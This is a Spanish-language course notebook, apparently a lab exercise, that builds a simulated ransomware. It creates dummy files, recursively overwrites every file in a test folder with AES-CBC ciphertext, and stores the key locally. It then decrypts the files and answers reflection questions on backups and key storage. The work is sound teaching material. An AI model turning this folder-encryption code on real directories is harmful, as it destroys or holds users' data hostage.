# Parte 4: Implementación de un Ransomware Simulado

- Crear un script que cifre archivos de texto con AES
    - prueben realizar el script en un folder con varios archivos
- Implementar una clave de descifrado en otro script.

In [1]:
import os
import random
from AES import *

In [2]:
# Ubicaciones de interés
targetFolder = "./tests/files_to_attack"
key_file = "./tests/clave.txt"

In [3]:
# Crear archivos para cifrar
def generate_txt(file_path, size=10):
  size = size * 1024 * 1024
  chunk = b"PRUEBA" * 1024 * 1024

  os.makedirs(os.path.dirname(file_path), exist_ok=True)

  with open(file_path, "wb") as f:
    for _ in range(size // len(chunk)):
      f.write(chunk)
            
for i in range(20):
  randomNumber = random.randint(1, 100)
  if(randomNumber % 2 == 0):
    generate_txt(f"{targetFolder}/subFolder1/file{i}.txt", 10)
  elif(randomNumber % 3 == 0):
    generate_txt(f"{targetFolder}/subFolder1/subFolder2/file{i}.txt", 10)
  else:
    generate_txt(f"{targetFolder}/file{i}.txt", 10)

In [4]:
# Funciones para cifrar directorios
def encrypt_file(file_path, key):
  with open(file_path, 'rb') as f:
    data = f.read()
  
  encrypted_data, _, initVector = cipherAES_CBC(data, key)
  
  with open(file_path, 'wb') as f:
    f.write(initVector + encrypted_data)

def encrypt_folder(target_folder, key):
  for root, _, files in os.walk(target_folder):
    for file in files:
      file_path = os.path.join(root, file)
      encrypt_file(file_path, key)

In [5]:
# Atacar directorio
key = None
try:
  with open(key_file, "rb") as file:
    key = file.read()
except FileNotFoundError:
  pass

if key is None:
  key = getRandomKey()

with open(key_file, 'wb') as file:
  file.write(key)

encrypt_folder(targetFolder, key)
print("Archivos encriptados 😈")

Archivos encriptados 😈


In [6]:
# Funciones para desencriptar directorios
def decrypt_file(file_path, key):
  with open(file_path, 'rb') as f:
    cipher_data = f.read()
    
  initVector = cipher_data[:AES.block_size]
  
  cipher_data = cipher_data[AES.block_size:]
  
  decrypted_data = decipherAES_CBC(cipher_data, key, initVector)
  
  with open(file_path, 'wb') as f:
    f.write(decrypted_data)

def decrypt_folder(target_folder, key):
  for root, _, files in os.walk(target_folder):
    for file in files:
      file_path = os.path.join(root, file)
      decrypt_file(file_path, key)

In [7]:
# Liberar directorio
key = None
try:
  with open(key_file, "rb") as file:
    key = file.read()

  decrypt_folder(targetFolder, key)
  print("Archivos desencriptados 😇")
except FileNotFoundError:
  print("No se encontró la clave para desencriptar los archivos 😢")

Archivos desencriptados 😇


## Preguntas para reflexión:

### ¿Cómo podríamos evitar ataques de ransomware?

R: Siguiendo el ejemplo implementado en este ejercicio, el ataque de ransomware se pudo haber evitado al mantener copias de seguridad (backups) de los archivos atacados, de manera que, aún si se pierde en su totalidad el contenido de los archivos cifrados, se cuenta con un respaldo. Estas copias de seguridad deben ser monitoreadas constantemente para asegurar que la información es la más actualizada disponible. Así mismo, se debe asegurar que dichas copias se encuentren en directorios aislados que garanticen mantenerlos seguros en caso de que los archivos originales se vean atacados.

### ¿Qué tan importante es almacenar claves de manera segura?

R: El almacenamiento de claves de forma segura es crucial en este tipo de ataques, pues tanto al atacante como a la víctima les interesa tener la posibilidad de recuperar los archivos en cualquier momento. Si no se almacenaran las claves, o bien, si estas se llegaran a perder, correspondería a la pérdida definitiva de la información, con lo que el atacante no tendría acceso a su cuota de "rescate", y la víctima no tendría forma alguna de recuperar su información.